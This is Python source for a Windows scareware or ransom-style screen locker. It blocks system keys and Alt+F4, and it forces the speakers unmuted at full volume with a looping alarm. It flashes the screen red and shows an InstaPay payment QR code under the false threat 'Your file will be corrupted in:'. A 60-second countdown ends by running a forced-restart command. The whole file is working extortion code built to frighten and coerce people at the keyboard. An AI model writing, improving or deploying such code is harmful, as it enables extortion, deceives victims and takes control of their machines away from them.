import tkinter as tk
from tkinter import font
from pygame import mixer
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities
import keyboard
from PIL import Image, ImageTk
import os
import socket
import qrcode
import subprocess
import time
import threading
import queue

devices = AudioUtilities.GetSpeakers()  
volume_control = devices.EndpointVolume

keyboard.block_key('tab') 
keyboard.block_key('left windows')
keyboard.block_key('right windows')
keyboard.block_key('tab') 
keyboard.block_key('left windows')
keyboard.block_key('right windows')
keyboard.add_hotkey('alt+f4', lambda: None) 
keyboard.add_hotkey('alt+escape', lambda: None) 
def enforce_unmute():
    if volume_control.GetMute() == 1:
        volume_control.SetMute(0, None)
    
    current_vol = volume_control.GetMasterVolumeLevelScalar()
    if current_vol < 1.0:
        new_vol = min(current_vol + 0.01, 1.0) 
        volume_control.SetMasterVolumeLevelScalar(new_vol, None)
    root.after(100, enforce_unmute)
    
speed = 2
frequency = 44100
newfreq = int(frequency * speed)

mixer.init(newfreq)
root=tk.Tk()
root.attributes('-fullscreen', True)

def get_local_ip():
    """Gets the active local network IP address of this computer."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def generate_qr_and_run():
    # Delete old QR code if exists so app.py can generate a fresh one
    qr_filename = "qr.png"
    if os.path.exists(qr_filename):
        try:
            os.remove(qr_filename)
            print(f"Removed old QR code: {qr_filename}")
        except Exception as e:
            print(f"Could not remove old QR code: {e}")
    
    print("\nStarting Flask Backend Server...")
    print("Waiting for app.py to generate QR code...")
    
    # Determine Python executable (use venv if exists)
    venv_python = os.path.join(".venv", "Scripts", "python.exe")
    python_exe = venv_python if os.path.exists(venv_python) else "python"
    
    print(f"Using Python: {python_exe}")
    
    # Start app.py as a non-blocking subprocess with output capture
    global app_process
    app_process = subprocess.Popen(
        [python_exe, "app.py"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
        bufsize=1
    )
    
    # Start background thread to read output
    output_thread = threading.Thread(target=read_app_output, daemon=True)
    output_thread.start()
    
    # Wait for QR code to be generated (max 10 seconds)
    max_wait = 10
    waited = 0
    while not os.path.exists(qr_filename) and waited < max_wait:
        time.sleep(0.5)
        waited += 0.5
    
    if os.path.exists(qr_filename):
        print(f"✅ QR code detected! Ready to display UI.")
    else:
        print(f"⚠️ Warning: QR code not found after {max_wait}s, proceeding anyway...")

# Global variable to track app.py process
app_process = None
output_queue = queue.Queue()

def read_app_output():
    """Background thread to read app.py output without blocking"""
    global app_process
    if app_process and app_process.stdout:
        try:
            for line in iter(app_process.stdout.readline, ''):
                if line:
                    output_queue.put(line.strip())
                if app_process.poll() is not None:
                    break
        except:
            pass

def togglecol():
    current=root.cget("bg")
    new="black" if current == "red" else "red"
    root.config(bg=new)
    def update_children(parent):
        for child in parent.winfo_children():
            try:
                child.config(bg=new)
                if isinstance(child, tk.Label) and child.cget("text"):
                    child.config(fg="white")
            except tk.TclError:
                pass
            update_children(child)
            
    update_children(root)
    root.after(200,togglecol)

def alarm():
    mixer.music.load("alarm.mp3")
    mixer.music.play(loops=-1)
    mixer.music.set_volume(1.0)

def on_closing():
    global app_process
    keyboard.unblock_key('tab')
    keyboard.unblock_key('left windows')
    keyboard.unblock_key('right windows')
    keyboard.remove_hotkey('alt+f4')
    keyboard.remove_hotkey('alt+escape')
    
    # Terminate app.py if it's still running
    if app_process and app_process.poll() is None:
        print("Terminating app.py process...")
        app_process.terminate()
        try:
            app_process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            app_process.kill()
    
    root.destroy()
def gifframes(path):
    frames = []
    i = 0
    while True:
        try:
            frame = tk.PhotoImage(file=path, format=f"gif -index {i}")
            frames.append(frame)
            i += 1
        except tk.TclError:
            break
    return frames

def animate_gif(root, label, frames, delay, current_idx=0):
    if not frames:
        return
    
    label.config(image=frames[current_idx])
    next_idx = (current_idx + 1) % len(frames)
    root.after(delay, animate_gif, root, label, frames, delay, next_idx)

def exit(event, root):
    on_closing()

def check_shutdown_signal():
    """Continuously check for shutdown signal from app.py"""
    global app_process
    
    # Check for shutdown signal file
    if os.path.exists("shutdown_signal.txt"):
        print("\n✅ Receipt verified! Shutting down gracefully...")
        # Clean up signal file
        try:
            os.remove("shutdown_signal.txt")
        except:
            pass
        
        # End rand.py execution
        on_closing()
        return
    
    # Check app.py output from queue (non-blocking)
    try:
        while not output_queue.empty():
            line = output_queue.get_nowait()
            print(f"[app.py] {line}")
            if "image 1/1" in line.lower():
                print("\n✅ Image processing detected! Shutting down gracefully...")
                # End rand.py execution
                on_closing()
                return
    except queue.Empty:
        pass
    except Exception as e:
        print(f"Error checking output: {e}")
    
    # Check again in 500ms
    root.after(500, check_shutdown_signal)
    # Check again in 500ms
    root.after(500, check_shutdown_signal)

def warningui():

    left_frame = tk.Frame(root)
    left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=50, pady=50)
    root.bind("<Escape>", lambda event: exit(event, root))
    root.bind("<Escape><0>", lambda event: exit(event, root))
    right_frame = tk.Frame(root)
    right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=50, pady=50)
    alarm_label = tk.Label(left_frame)
    alarm_label.pack(pady=(10, 5), expand=True, anchor="s") 
    
    try:
        frames = gifframes("alarm.gif") 
        if frames:
            alarm_label.frames = frames 
            animate_gif(root, alarm_label, frames, delay=80)
    except Exception as e:
        print(f"Error loading alarm.gif: {e}")

    title_font = font.Font(family="Helvetica", size=36, weight="bold")
    title_label = tk.Label(left_frame, text="TRANSACTION PENDING", font=title_font, fg="#d32f2f")
    title_label.pack(pady=20)

    msg_text = (
        "Please scan the InstaPay QR code\n"
        "to complete your secure transfer.\n\n" 
        "Your file will be corrupted in:"
    )
    msg_label = tk.Label(left_frame, text=msg_text, font=("Helvetica", 20), justify="center")
    msg_label.pack(pady=10, expand=True, anchor="n")
    timer_font = font.Font(family="Helvetica", size=48, weight="bold")
    timer_label = tk.Label(left_frame, text="01:00", font=timer_font)
    timer_label.pack(pady=10, expand=True, anchor="n")

    countdown(60, timer_label)#change timer optional
    try:
        qr_image = Image.open("qr.png")
        qr_image = qr_image.resize((450, 450), Image.Resampling.LANCZOS)
        qr_photo = ImageTk.PhotoImage(qr_image)
        qr_label = tk.Label(right_frame, image=qr_photo)
        qr_label.image = qr_photo
        qr_label.pack(expand=True)
    except Exception as e:
        print(f"Error loading qr.jpeg: {e}")
        error_label = tk.Label(right_frame, text="[ QR Code Missing ]", font=("Helvetica", 24), fg="red", bg="white")
        error_label.pack(expand=True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.bind("<Alt-F4>", lambda e: "break") 
    root.bind("<F1>", lambda e: "break")
    root.bind("Alt-Escape>", lambda e: "break")

    root.bind("<Escape>", lambda event: on_closing())
    
    # Start checking for shutdown signal from app.py
    check_shutdown_signal()
    
    root.mainloop()
def countdown(time_left, label):
    if time_left >= 0:
        mins, secs = divmod(time_left, 60)
        time_format = f"{mins:02d}:{secs:02d}"
        label.config(text=time_format)
        root.after(1000, countdown, time_left - 1, label)
    else:
        label.config(text="00:00\nSHUTTING DOWN...", fg="white")
        os.system("shutdown /r /t 0")


# Start app.py and wait for QR code generation
generate_qr_and_run()

root.config(bg= "red",cursor="none")
togglecol()
alarm()
enforce_unmute()
warningui()

